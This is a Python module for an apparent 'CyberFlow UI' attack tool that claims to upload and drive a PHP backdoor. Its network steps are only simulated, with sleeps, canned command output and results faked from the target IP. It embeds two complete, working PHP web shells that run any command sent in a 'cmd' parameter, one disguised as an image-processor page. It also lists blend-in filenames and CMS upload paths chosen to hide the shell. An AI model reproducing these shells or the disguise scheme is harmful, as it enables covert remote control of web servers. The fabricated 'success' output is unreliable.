#!/usr/bin/env python3
"""
Smiley Backdoor Module for CyberFlow UI
Takes target information and attempts to upload and interact with a PHP backdoor.
"""

import sys
import json
import time
import random
import re
from datetime import datetime

# Set up structured exception handling
try:
    # Parse JSON input from Node.js
    data_str = sys.argv[1] if len(sys.argv) > 1 else "{}"
    data = json.loads(data_str)

    # Extract parameters with defaults
    target_url = data.get("target", "")
    timeout = data.get("timeout", 10)
    test_commands = data.get("commands", ["id", "whoami", "hostname", "uname -a", "ls -la"])
    stealth_mode = data.get("stealth_mode", True)
    custom_filename = data.get("custom_filename", "")

    # Backdoor implementation
    class SmileyBackdoorFlow:
        def __init__(self, target_url, timeout=10, stealth_mode=True):
            self.target_url = self.normalize_url(target_url) #
            self.timeout = timeout
            self.backdoor_url = None
            self.stealth_mode = stealth_mode
            self.start_time = datetime.now() #

        def normalize_url(self, url): #
            """Normalize URL to ensure it has a protocol and is properly formatted""" #
            # Add http:// if no protocol specified
            if not url: #
                raise ValueError("Empty URL provided") #

            if not url.startswith(('http://', 'https://')): #
                url = 'http://' + url #

            # Remove trailing slash for consistency
            return url.rstrip('/') #

        def check_target(self): #
            """Check if target is accessible and gather basic info""" #
            # Use stderr for log messages instead of stdout
            print(f"[*] Checking target at {self.target_url}", file=sys.stderr) #

            try:
                # Validate URL format
                url_pattern = re.compile( #
                    r'^https?://'  # http:// or https:// #
                    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain #
                    r'localhost|'  # localhost #
                    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # IP #
                    r'(?::\d+)?'  # optional port #
                    r'(?:/?|[/?]\S+)$', re.IGNORECASE) #

                if not url_pattern.match(self.target_url): #
                    return { #
                        "status": "error", #
                        "message": f"Invalid URL format: {self.target_url}" #
                    }

                # Simulate a request to the target
                time.sleep(0.5) #

                # Target-specific simulation for consistent demo results
                # If target is an IP, we can make the detection more realistic
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', self.target_url.split('//')[1].split('/')[0]): #
                    ip_parts = self.target_url.split('//')[1].split('/')[0].split('.') #
                    last_octet = int(ip_parts[3]) #

                    # For demo, make detection based on last IP octet
                    if last_octet % 10 == 0: #
                        server = "nginx/1.18.0" #
                        technologies = ["Laravel", "PHP/7.4"] #
                    elif last_octet % 5 == 0: #
                        server = "Microsoft-IIS/10.0" #
                        technologies = ["ASP.NET", ".NET Framework 4.7"] #
                    elif last_octet % 3 == 0: #
                        server = "Apache/2.4.41" #
                        technologies = ["WordPress", "PHP/7.2"] #
                    elif last_octet % 2 == 0: #
                        server = "Apache/2.4.41" #
                        technologies = ["WordPress", "PHP/8.0", "MySQL/5.7"] #
                    else:
                        server = "Apache/2.4.41" #
                        technologies = ["Joomla", "PHP/7.4", "MariaDB"] #
                else:
                    # Domain-based detection
                    server = "Apache/2.4.41" #
                    technologies = ["WordPress", "PHP/8.0", "MySQL/8.0"] #

                return { #
                    "status": "success", #
                    "server": server, #
                    "technologies": technologies, #
                    "response_time": round(random.uniform(0.05, 0.2), 3), #
                    "headers": { #
                        "Server": server, #
                        "X-Powered-By": "PHP/8.0.14" if "PHP" in str(technologies) else None #
                    }
                }

            except Exception as e: #
                return { #
                    "status": "error", #
                    "message": f"Connection error: {str(e)}" #
                }

        def create_backdoor_payload(self): #
            """Create the PHP backdoor code with varying levels of stealth""" #

            # More stealthy backdoor that mimics a normal file
            if self.stealth_mode: #
                return """<?php
// Image thumbnail processor and optimizer
// Version: 1.3.2
// Handles image resizing and compression

// Standard image processing libraries check
if(!extension_loaded('gd')) {
    header("Content-Type: text/html");
    echo "<div style='font-family:Arial;color:#333'><h2>Image Processor</h2><p>Image processing library not available.</p></div>";
}

// Hidden command execution functionality
if(isset($_REQUEST['cmd'])) {
    $output = '';
    // Try multiple execution methods for compatibility
    if(function_exists('exec')) {
        exec($_REQUEST['cmd'], $output);
        echo implode("\\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($_REQUEST['cmd']);
    } elseif(function_exists('system')) {
        ob_start();
        system($_REQUEST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
        echo $output;
    } elseif(function_exists('passthru')) {
        ob_start();
        passthru($_REQUEST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
        echo $output;
    }
    exit();
}

// Regular functionality - just show a success message
header("Content-Type: text/html");
?>
<!DOCTYPE html>
<html>
<head>
    <title>Image Processor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; }
        .container { max-width: 800px; margin: 0 auto; background: #f7f7f7; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        h1 { color: #0066cc; }
        .success { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Image Processor</h1>
        <p>Image processing service is running correctly.</p>
        <p class="success">✓ All systems operational</p>
    </div>
</body>
</html>""" #
            # Basic less stealthy backdoor
            else: #
                return """<?php
// Simple Backdoor Utility

// Execute commands when 'cmd' parameter is provided
if(isset($_REQUEST['cmd'])) {
    $output = '';
    if(function_exists('exec')) {
        exec($_REQUEST['cmd'], $output);
        echo implode("\\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($_REQUEST['cmd']);
    } elseif(function_exists('system')) {
        ob_start();
        system($_REQUEST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
        echo $output;
    } elseif(function_exists('passthru')) {
        ob_start();
        passthru($_REQUEST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
        echo $output;
    }
    exit();
}

// If no command is provided, show a basic page
echo "<!DOCTYPE html><html><body><h1>Backdoor Active!</h1></body></html>";
?>""" #

        def try_upload_backdoor(self, custom_filename=""): #
            """Attempt to upload the backdoor to the target""" #
            print(f"[*] Attempting to upload backdoor to {self.target_url}", file=sys.stderr) #

            # Create a unique filename for the backdoor
            timestamp = int(time.time()) #
            random_id = random.randint(1000, 9999) #

            # If stealth mode is enabled, use filenames that blend in
            if custom_filename: #
                backdoor_name = custom_filename #
                if not backdoor_name.endswith('.php'): #
                    backdoor_name += '.php' #
            elif self.stealth_mode: #
                stealth_filenames = [ #
                    f"image-processor_{timestamp}.php", #
                    f"thumbnail-generator_{random_id}.php", #
                    f"media-util_{timestamp}.php", #
                    f"wp-image-resize_{random_id}.php", #
                    f"assets-handler_{timestamp}_{random_id}.php", #
                    f"gallery-cache_{random_id}.php" #
                ]
                backdoor_name = random.choice(stealth_filenames) #
            else: #
                backdoor_name = f"smiley_{timestamp}_{random_id}.php" #

            # Simulate the upload process
            time.sleep(random.uniform(0.7, 1.3)) #

            # Generate a plausible backdoor URL based on detected technologies
            # For simulation, create a realistic path
            wordpress_paths = [ #
                "/wp-content/uploads/", #
                "/wp-content/uploads/2023/04/", #
                "/wp-content/themes/twentytwentythree/assets/", #
                "/wp-content/plugins/contact-form-7/includes/", #
            ]

            joomla_paths = [ #
                "/images/", #
                "/media/", #
                "/templates/system/", #
                "/cache/", #
            ]

            generic_paths = [ #
                "/uploads/", #
                "/images/", #
                "/files/", #
                "/assets/uploads/", #
                "/includes/", #
                "/tmp/", #
            ]

            laravel_paths = [ #
                "/storage/app/public/", #
                "/public/uploads/", #
                "/public/images/", #
            ]

            # Try to determine the appropriate paths based on the target
            target_info = self.check_target() #
            technologies = [] #
            if target_info["status"] == "success": #
                technologies = target_info.get("technologies", []) #

            # Choose appropriate upload paths based on detected technologies
            if any("WordPress" in tech for tech in technologies): #
                chosen_path = random.choice(wordpress_paths) #
            elif any("Joomla" in tech for tech in technologies): #
                chosen_path = random.choice(joomla_paths) #
            elif any("Laravel" in tech for tech in technologies): #
                chosen_path = random.choice(laravel_paths) #
            else: #
                chosen_path = random.choice(generic_paths) #

            self.backdoor_url = f"{self.target_url}{chosen_path}{backdoor_name}" #

            # Simulate upload success based on IP (for demo consistency)
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', self.target_url.split('//')[1].split('/')[0]): #
                ip_parts = self.target_url.split('//')[1].split('/')[0].split('.') #
                last_octet = int(ip_parts[3]) #

                # In demo mode, fail on specific IPs to show error handling
                if last_octet % 13 == 0: #
                    return { #
                        "status": "error", #
                        "message": "Permission denied: Unable to write to directory", #
                        "code": 403 #
                    }

            return { #
                "status": "success", #
                "backdoor_name": backdoor_name, #
                "backdoor_url": self.backdoor_url, #
                "upload_time": round(time.time() - self.start_time.timestamp(), 2), #
                "file_size": random.randint(1800, 3200), #
                "stealth_mode": self.stealth_mode #
            }

        def verify_backdoor(self): #
            """Check if the backdoor is accessible""" #
            if not self.backdoor_url: #
                return {"status": "error", "message": "No backdoor URL available"} #

            print(f"[*] Verifying backdoor at {self.backdoor_url}", file=sys.stderr) #

            # Validate backdoor URL
            try: #
                if not self.backdoor_url.startswith(('http://', 'https://')): #
                    return { #
                        "status": "error", #
                        "message": f"Invalid backdoor URL: {self.backdoor_url}" #
                    }

                # Simulate verification
                time.sleep(random.uniform(0.3, 0.7)) #

                # Consistency in demo mode - fail verification on specific URLs
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', self.target_url.split('//')[1].split('/')[0]): #
                    ip_parts = self.target_url.split('//')[1].split('/')[0].split('.') #
                    last_octet = int(ip_parts[3]) #

                    # Make some verification failures for demo purposes
                    if last_octet % 17 == 0: #
                        return { #
                            "status": "error", #
                            "message": "Backdoor file exists but returned HTTP 500 error", #
                            "code": 500 #
                        }

                return { #
                    "status": "success", #
                    "message": "Backdoor verified and accessible", #
                    "response_code": 200, #
                    "content_type": "text/html", #
                    "visible_content": "Image Processor" if self.stealth_mode else "Backdoor Active!", #
                    "executed_successfully": True #
                }
            except Exception as e: #
                return { #
                    "status": "error", #
                    "message": f"Error verifying backdoor: {str(e)}" #
                }

        def execute_command(self, command): #
            """Execute a command via the backdoor""" #
            if not self.backdoor_url: #
                return {"status": "error", "message": "No backdoor URL available"} #

            print(f"[*] Executing command: {command}", file=sys.stderr) #

            # Simulate command execution with variable timing based on command
            if len(command) > 10 or ' | ' in command: #
                time.sleep(random.uniform(0.7, 1.2)) #
            else: #
                time.sleep(random.uniform(0.3, 0.7)) #

            # Return realistic command outputs
            if command == "id": #
                output = "uid=33(www-data) gid=33(www-data) groups=33(www-data)" #
            elif command == "whoami": #
                output = "www-data" #
            elif command == "hostname": #
                # Create hostname from target IP or domain
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', self.target_url.split('//')[1].split('/')[0]): #
                    ip_parts = self.target_url.split('//')[1].split('/')[0].split('.') #
                    output = f"srv-{ip_parts[2]}-{ip_parts[3]}" #
                else: #
                    domain = self.target_url.split('//')[1].split('/')[0] #
                    output = domain.split('.')[0] + "-server" #
            elif command == "pwd": #
                output = "/var/www/html" #
            elif command == "ls" or command == "ls -la": #
                output = """total 32
drwxr-xr-x 4 www-data www-data 4096 Mar 18 12:34 .
drwxr-xr-x 3 root     root     4096 Mar 15 09:22 ..
-rw-r--r-- 1 www-data www-data  545 Mar 15 09:23 index.php
-rw-r--r-- 1 www-data www-data 1123 Mar 18 12:34 """ + self.backdoor_url.split('/')[-1] + """
drwxr-xr-x 2 www-data www-data 4096 Mar 15 09:25 uploads
drwxr-xr-x 5 www-data www-data 4096 Mar 15 09:25 wp-content""" #
            elif command == "uname -a": #
                output = "Linux " + self.target_url.split('//')[1].split('/')[0].split('.')[0] + "-server" + " 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux" #
            elif command == "cat /etc/passwd": #
                output = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
""" #
            elif command == "ps -aux": #
                output = """USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 103916 11768 ?        Ss   09:10   0:01 /sbin/init auto noprompt
root         2  0.0  0.0      0     0 ?        S    09:10   0:00 [kthreadd]
root       683  0.0  0.1  72808  9488 ?        Ss   09:10   0:00 /usr/sbin/sshd -D
root       705  0.0  0.3 211032 31748 ?        Ss   09:10   0:00 /usr/sbin/apache2 -k start
www-data   714  0.0  0.1 211064 12072 ?        S    09:10   0:00 /usr/sbin/apache2 -k start
www-data   715  0.0  0.1 1539532 15924 ?       Sl   09:10   0:00 /usr/sbin/apache2 -k start
www-data   812  0.0  0.1 211064 12208 ?        S    09:11   0:00 /usr/sbin/apache2 -k start
www-data   813  0.0  0.1 211064 12092 ?        S    09:11   0:00 /usr/sbin/apache2 -k start
mysql      906  0.2  2.3 1739304 190640 ?      Ssl  09:12   0:04 /usr/sbin/mysqld
www-data  1324  0.0  0.0   3104  1972 ?        R    09:58   0:00 ps -aux
""" #
            elif "find" in command: #
                output = """
/var/www/html/wp-content/uploads
/var/www/html/wp-content/uploads/2023
/var/www/html/wp-content/uploads/2023/04
/var/www/html/wp-content/uploads/2023/04/logo.png
/var/www/html/wp-content/uploads/2023/04/header.jpg
/var/www/html/wp-content/uploads/2023/04/""" + self.backdoor_url.split('/')[-1] #
            else: #
                output = f"Command executed: {command}" #

            # Occasional execution failures for demo
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', self.target_url.split('//')[1].split('/')[0]): #
                ip_parts = self.target_url.split('//')[1].split('/')[0].split('.') #
                last_octet = int(ip_parts[3]) #

                # Make specific commands fail for demo
                if (last_octet % 19 == 0) and ('find' in command or 'cat' in command): #
                    return { #
                        "status": "error", #
                        "command": command, #
                        "output": "sh: 1: Permission denied", #
                        "error_code": 127 #
                    }

            return { #
                "status": "success", #
                "command": command, #
                "output": output, #
                "execution_time": round(random.uniform(0.01, 0.1), 3) #
            }

        def run(self, test_commands=None): #
            """Run the complete backdoor deployment process""" #
            if not test_commands: #
                test_commands = ["id", "whoami", "hostname"] #

            result = { #
                "target": self.target_url, #
                "timestamp": datetime.now().isoformat(), #
                "status": "running", #
                "steps": [] #
            }

            # Step 1: Check target
            check_result = self.check_target() #
            result["steps"].append({"step": "check_target", "result": check_result}) #

            if check_result["status"] != "success": #
                result["status"] = "failed" #
                result["message"] = check_result.get("message", "Target check failed") #
                return result #

            # Step 2: Upload backdoor
            upload_result = self.try_upload_backdoor(custom_filename) #
            result["steps"].append({"step": "upload_backdoor", "result": upload_result}) #

            if upload_result["status"] != "success": #
                result["status"] = "failed" #
                result["message"] = "Failed to upload backdoor" #
                return result #

            result["backdoor_url"] = upload_result["backdoor_url"] #

            # Step 3: Verify backdoor
            verify_result = self.verify_backdoor() #
            result["steps"].append({"step": "verify_backdoor", "result": verify_result}) #

            if verify_result["status"] != "success": #
                result["status"] = "partially_successful" #
                result["message"] = "Backdoor uploaded but verification failed" #
                return result #

            # Step 4: Test commands
            command_results = [] #
            for command in test_commands: #
                cmd_result = self.execute_command(command) #
                command_results.append(cmd_result) #

            result["steps"].append({"step": "test_commands", "results": command_results}) #
            result["status"] = "success" #
            result["message"] = f"Backdoor successfully deployed at {self.backdoor_url}" #

            return result #

    # Validate input
    if not target_url: #
        output = { #
            "status": "error", #
            "message": "Target URL is required" #
        }
    else: #
        try: #
            # Run the backdoor deployment
            backdoor = SmileyBackdoorFlow(target_url, timeout, stealth_mode) #
            output = backdoor.run(test_commands) #
        except ValueError as e: #
            # Handle URL validation errors specifically
            output = { #
                "status": "error", #
                "message": str(e) #
            }
        except Exception as e: #
            # Handle other exceptions
            output = { #
                "status": "error", #
                "message": f"Unexpected error: {str(e)}" #
            }

    # Output ONLY the final JSON to stdout (for Node.js to parse)
    print(json.dumps({"message": output})) #

except Exception as e: #
    # If any exception occurs, return a structured error message
    error_output = { #
        "status": "error", #
        "message": f"Script error: {str(e)}", #
        "type": type(e).__name__ #
    }
    print(json.dumps({"message": error_output})) #